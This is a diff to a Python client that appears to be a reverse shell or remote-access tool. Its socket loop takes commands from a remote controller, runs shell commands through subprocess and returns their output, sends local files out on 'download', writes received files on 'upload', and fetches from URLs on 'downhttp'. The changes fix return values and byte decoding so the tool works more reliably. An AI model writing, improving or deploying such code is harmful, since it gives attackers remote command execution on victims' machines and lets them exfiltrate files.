@@ -22,14 +22,14 @@ def Upload(sock, file):
   d = f.read()
   Send(sock, d, '')
   f.close()
-  return 'File sent 🍺'
+  Send(sock, 'File sent 🍺', '')
 
 def Download(sock, file):
   f = open(file, 'wb')
   d = Receive(sock)
   f.write(d)
   f.close()
-  return 'File received 🍺'
+  Send(sock, 'File received 🍺', '')
 
 # download from url (unencrypted)
 def Downhttp(sock, url):
@@ -77,6 +77,8 @@ def run(s):
                stdout=sp.PIPE, 
                stderr=sp.PIPE)
   out, err = c.communicate()
+  out = out.decode('utf-8')
+  err = err.decode('utf-8')
   return out + err
 
 while True:
@@ -93,6 +95,7 @@ while True:
       Send(sock, os.getcwd() + '>')
 
     while active:
+      ret = ''
       data = Receive(sock)
 
       if data == 'exit':
@@ -107,10 +110,10 @@ while True:
           ret = 'Error changing directory.\n'
 
       elif data.startswith('download '):
-        ret = Upload(sock, data[9:])
+        Upload(sock, data[9:])
 
       elif data.startswith('downhttp '):
-        ret = Downhttp(sock, data[9:])
+        Downhttp(sock, data[9:])
 
       elif data.startswith('upload '):
         ret = Download(sock, data[7:])
